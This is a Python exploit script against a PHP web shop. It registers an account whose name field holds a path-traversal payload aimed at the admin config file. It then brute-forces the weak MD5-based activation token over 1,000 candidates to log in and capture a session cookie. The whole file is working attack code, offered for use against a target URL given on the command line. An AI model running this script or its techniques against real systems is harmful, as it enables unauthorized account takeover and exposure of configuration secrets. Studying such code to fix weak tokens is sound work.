#!/usr/bin/env python3

import requests
import hashlib
import argparse
import traceback
from urllib.parse import urljoin
import time

PROXY = {"http": "http://127.0.0.1:8080"}

def brute_force_vrf_code(target, email, password):
    """
    Brute-forcing the activation token 
    """
    print("[*] Brute-forcing the activation token to login...")
    for random in range(0, 999):
        random_number = f"{random:03d}"
        vrf_code = hashlib.md5((f"{email}{random_number}").encode()).hexdigest()
        print(f"[*] {random_number}: {vrf_code}")
        lgnUrl = urljoin(target, "/login.php")
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        lgnData = {"cust_email": f"{email}", "cust_password": f"{password}", "cust_validation_code": f"{vrf_code}", "form1": "Submit"}
        try:
            lgnRes = requests.post(lgnUrl, headers=headers, data=lgnData, allow_redirects=False)
            if 'PHPSESSID' in lgnRes.cookies and lgnRes.status_code == 302:
                PHPSESSID_value = lgnRes.cookies['PHPSESSID']
                print("[+] Logged in successfully")
                print(f"[+] Cookie: PHPSESSID={PHPSESSID_value}")
                return PHPSESSID_value
        except Exception as e:
            print("[-] Error logging in: ", e)
            traceback.print_exc()


def nrmlUsrLgn(target):
    """
    Register a new account 
    """
    rgstrAccUrl = urljoin(target, "/registration.php")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    rnd = str(int(time.time()))[3:]
    email = f"john{rnd}@doe.ltd"
    password = "Password!1234"
    lfi_payload = "../admin/inc/config.php"
    rgstrAccData = {"cust_name": f"{lfi_payload}", "cust_cname": "ACME", "cust_email": f"{email}", "cust_phone": "+1234567890", "cust_address": "Down to earth, but still above of you.", "cust_country": "230", "cust_city": "Irvine", "cust_state": "California", "cust_zip": "123456", "cust_password": f"{password}", "cust_re_password": f"{password}", "form1": "Register"}
    print("[*] Creating a new user account...")
    try:
        rgstrAccRes = requests.post(rgstrAccUrl, headers=headers, data=rgstrAccData)
        if "Your registration is completed. Please check your email address to follow the process to confirm your registration." in rgstrAccRes.text:
            print(f"[+] User {email}:{password} has been successfully registered")
            nrmlUsrSession = brute_force_vrf_code(target, email, password)
            if nrmlUsrSession:
                return nrmlUsrSession
            else:
                print("[-] Failed to brute-force the activation code")
    except Exception as e:
        print("[-] Error creating a new user account: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Weak random token generation exploitation.")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.178.230)")
    args = parser.parse_args()

    nrml_user_session = nrmlUsrLgn(args.target)

if __name__ == "__main__":
    main()
